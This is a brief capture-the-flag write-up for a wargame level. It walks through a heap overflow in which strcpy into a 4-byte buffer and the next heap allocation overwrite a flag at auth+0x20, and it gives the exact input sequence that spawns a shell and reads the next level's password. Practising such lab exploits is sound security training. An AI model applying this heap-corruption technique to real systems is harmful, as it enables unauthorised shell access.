## Heap overflow of strcpy(): what's your input?

This level has a long codebase, if we have to retain the essential lines, here they are:

```c
auth = malloc(4);

if (uVar6 < 0x1f) {                            //0x1f = 31
    strcpy(auth,local_8b);                     //overflow is possible
}

service = strdup(acStack_89);

if (*(int *)(auth + 0x20) == 0) {               //0x20 = 32, the condition checks at auth + 32 bytes
    fwrite("Password:\n",1,10,stdout);
}
else {
    system("/bin/sh");
}
```

When executing the binary, it asks for an user input, and will display this:

```
printf("%p, %p \n",auth,service);
```

There are 4 commands possible:
- auth
- service
- login
- reset

Thus, we can get the flag if we manage to corrupt memory to make the condition if (*(int *)(auth + 0x20) == 0) false.

```sh
./level8
(nil), (nil) 
auth WTF
0x804a008, (nil) 
service WTFFFFFFFFFFFFFF
0x804a008, 0x804a018 
login
```
*service* grants 16 *service* bytes, and "WTFFFFFFFFFFFFFF" grants also 16 padding bytes, so we get 32 bytes in total.
We can see that by testing and seeing that when the system allocates block for each command input, there are a 0x10 bytes difference between each inputs. And 0x10 in hexa, equals to 16 in decimal.
Therefore, *login* can call the system to get the shell.

We are now in a shell, we can display the content of the next level's password.
